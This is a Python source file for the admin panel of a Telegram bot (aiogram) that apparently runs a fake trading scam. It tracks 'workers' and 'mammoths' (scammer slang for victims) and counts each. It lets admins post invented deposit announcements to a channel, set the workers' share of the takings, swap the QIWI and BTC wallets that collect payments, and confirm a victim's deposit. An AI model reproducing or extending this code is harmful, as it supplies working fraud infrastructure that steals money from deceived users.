import configparser

from aiogram import types
from aiogram.dispatcher import FSMContext
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton

from database import get_all_user, get_all_workers, get_all_mamonts, get_all_user_id, add_balance, get_deposit_pro, \
    get_procent_worker, update_proc, info_trade, info_trade_update, btc_adres, qiwi_token, update_payments
from loader import dp, bot
from state.states import Mailing_message, new_proc_wokr, Pencilsad, InfoText, SetPayments

gl_admin_markup = ReplyKeyboardMarkup(resize_keyboard=True,
    keyboard=[
        [
            KeyboardButton(text='📊 Статистика'),
            KeyboardButton(text='🗣 Рассылка')
        ],
        [
            KeyboardButton(text='% Выплат'),
            KeyboardButton(text='⚙️ Ручка')
        ],
        [
            KeyboardButton(text='Изм. Информацию'),
            KeyboardButton(text='Изм. Платежки')
        ],
        [
            KeyboardButton(text='Назад')
        ]
])

otmena = ReplyKeyboardMarkup(resize_keyboard=True,
    keyboard=[
        [
            KeyboardButton(text='Отмена')
        ]
])

async def penciil(gaga):
    dada = gaga.split(':')
    if len(dada) == 4:
        name = dada[0]
        userrrname = dada[1]
        price = dada[2]
        on_proc = dada[3]
        config = configparser.ConfigParser()
        config.read("settings.ini")
        dep_channel = config['Admin']['kanal']
        comission = int((int(on_proc) * 0.01) * int(price))
        await bot.send_message(dep_channel, f'⚜️ Успешное пополнение ⚜️\n📈 Сервис: {name} 📈\n🏦 Доля воркера: {comission}₽ (- {100 - int(on_proc)} %)\n💰 Сумма пополнения: {price}₽\n🏝 Воркер: {userrrname}')
        return True
    else:
        return False

async def Payments(gaga):
    dada = gaga.split(':')
    if len(dada) == 2:
        typee = dada[0]
        koshel = dada[1]
        update_payments(tap=typee, fap=koshel)
        return True
    else:
        return False

@dp.message_handler(commands='adm')
async def qwewqe(message: types.Message):
    config = configparser.ConfigParser()
    config.read("settings.ini")
    gl_admin = config["Admin"]["king_admin"]
    admin = config['Admin']['admin2']
    if int(gl_admin) == int(message.from_user.id) or int(admin) == int(message.from_user.id):
        await message.answer('👑 Вы <b>главный администратор</b>',
                             reply_markup=gl_admin_markup)

@dp.message_handler(text='📊 Статистика')
async def qwewqew(message: types.Message):
    config = configparser.ConfigParser()
    config.read("settings.ini")
    gl_admin = config["Admin"]["king_admin"]
    admin = config['Admin']['admin2']
    if int(gl_admin) == int(message.from_user.id) or int(admin) == int(message.from_user.id):
        all_count_user = get_all_user()[0]
        all_count_worker = get_all_workers()[0]
        all_count_mamonts = get_all_mamonts()[0]
        await message.answer('🤖<b> Статистика бота</b>\n\n'
                             f'🛗 Всего пользователей: {all_count_user}\n'
                             f'👷 Всего воркеров: {all_count_worker}\n'
                             f'🐘 Всего мамонтов: {all_count_mamonts}')

@dp.message_handler(text='🗣 Рассылка')
async def wqewqefd(message: types.Message):
    config = configparser.ConfigParser()
    config.read("settings.ini")
    gl_admin = config["Admin"]["king_admin"]
    admin = config['Admin']['admin2']
    if int(gl_admin) == int(message.from_user.id) or int(admin) == int(message.from_user.id):
        await message.answer('Введите текст для рассылки')
        await Mailing_message.q1.set()

@dp.message_handler(state=Mailing_message)
async def qwewqewq(message: types.Message, state: FSMContext):
    all_user = get_all_user_id()
    count = 0
    count_blocked = 0
    for i in all_user:
        try:
            if i[0] == message.from_user.id:
                pass
            else:
                count += 1
                await bot.send_message(chat_id=f'{i[0]}', text=message.text)
        except Exception:
            count_blocked += 1
            pass
    await message.answer('✅ Рассылка успешно завершена\n\n'
                         f'Получили: {count}\n'
                         f'Заблокировали бота: {count_blocked}')
    await state.finish()

@dp.message_handler(text='⚙️ Ручка')
async def wqewqefd(message: types.Message):
    config = configparser.ConfigParser()
    config.read("settings.ini")
    gl_admin = config["Admin"]["king_admin"]
    admin = config['Admin']['admin2']
    if int(gl_admin) == int(message.from_user.id) or int(admin) == int(message.from_user.id):
        await message.answer(f'<b>Напиши название проекта:@UserName:Сумму платежа:Процент</b>\n<i>Пример:</i> <code>Арбитраж:@Gangster:1590:70</code>')
        await Pencilsad.q1.set()

@dp.message_handler(state=Pencilsad)
async def admin_8(message:types.Message,state:FSMContext):
    check = await penciil(message.text)
    if check is False:
        await message.answer('<b>Произошла ошибка!</b>')
    else:
        await message.answer('<b>Успешно!</b>')
    await state.finish()

@dp.message_handler(text='% Выплат')
async def ojkiewq(message: types.Message):
    config = configparser.ConfigParser()
    config.read("settings.ini")
    gl_admin = config["Admin"]["king_admin"]
    admin = config['Admin']['admin2']
    if int(gl_admin) == int(message.from_user.id) or int(admin) == int(message.from_user.id):
        on_proc = get_procent_worker()[0]
        await message.answer(f'Сейчас % для воркера <code>{on_proc}</code>\n\n'
                             f'Введите новый процент для воркера')
        await new_proc_wokr.q1.set()

@dp.message_handler(state=new_proc_wokr.q1)
async def jiewq(message: types.Message, state: FSMContext):
    update_proc(count=int(message.text))
    await message.answer(f'Новый процент для воркера <code>{message.text}</code>')
    await state.finish()

@dp.message_handler(text='Изм. Информацию')
async def wqewqefd(message: types.Message):
    config = configparser.ConfigParser()
    config.read("settings.ini")
    gl_admin = config["Admin"]["king_admin"]
    admin = config['Admin']['admin2']
    text = info_trade()[0]
    if int(gl_admin) == int(message.from_user.id) or int(admin) == int(message.from_user.id):
        await message.answer(f'<b>Текущий текст:</b>\n\n{text}', reply_markup=otmena)
        await InfoText.q1.set()

@dp.message_handler(state=InfoText)
async def admin_8(message:types.Message,state:FSMContext):
    if message.text == 'Отмена':
        await state.finish()
    else:
        try:
            info_trade_update(text=message.text)
            await message.answer('Успешно.')
        except:
            await message.answer('Ошибка.')
    await message.answer('<b>Возвращаю в админ меню.</b>', reply_markup=gl_admin_markup)
    await state.finish()

@dp.message_handler(text='Изм. Платежки')
async def wqewqefd(message: types.Message):
    config = configparser.ConfigParser()
    config.read("settings.ini")
    gl_admin = config["Admin"]["king_admin"]
    admin = config['Admin']['admin2']
    qiwi = qiwi_token()[0]
    btc = btc_adres()[0]
    if int(gl_admin) == int(message.from_user.id) or int(admin) == int(message.from_user.id):
        await message.answer(f'<b>qiwi:</b> <code>{qiwi}</code>\n\n<b>btc:</b> <code>{btc}</code>\n\nЧтобы изменить что-то введите кошелек и вид(qiwi, btc) в формате\nКОШЕЛЕК:qiwi', reply_markup=otmena)
        await SetPayments.q1.set()

@dp.message_handler(state=SetPayments)
async def admin_8(message:types.Message,state:FSMContext):
    if message.text == 'Отмена':
        await state.finish()
    else:
        check = await Payments(message.text)
        if check is False:
            await message.answer('<b>Произошла ошибка!</b>')
        else:
            await message.answer('<b>Успешно!</b>')
    await message.answer('<b>Возвращаю в админ меню.</b>', reply_markup=gl_admin_markup)
    await state.finish()

@dp.callback_query_handler(lambda c: c.data and c.data.startswith('opl_'))
async def qwewqe(call: types.CallbackQuery):
    await call.message.delete()
    calldata = call.data.replace('opl_', '')
    user_id = calldata.split('_')[0]
    get_deposit_pro(user_id=user_id)
    await call.message.answer('Успешно, теперь мамонту нужна нажать " Проверить оплату "')
